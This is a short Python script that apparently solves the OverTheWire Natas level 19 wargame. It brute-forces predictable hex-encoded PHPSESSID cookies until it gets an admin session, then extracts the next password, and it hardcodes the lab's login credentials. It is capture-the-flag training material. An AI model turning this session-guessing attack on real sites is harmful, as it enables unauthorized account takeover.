import requests
import codecs
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
param = {'debug':'', 'username':'admin', 'password':''}
cook = {'PHPSESSID':''}
r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
if r.text.find('DEBUG') != -1:
#   print('Debug!')
    pass

count = 0  

while r.text.find('You are an admin') == -1:
    attack = str(count) + '-admin'
    cook = {'PHPSESSID':attack.encode('utf-8').hex()}
#   print('PHPSESSID: ' + str(attack.encode('utf-8').hex())  + '\n' + r.text)
    r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
    count += 1
print(r.text[r.text.find('Password: ') + 10:r.text.find('Password: ') + 42])
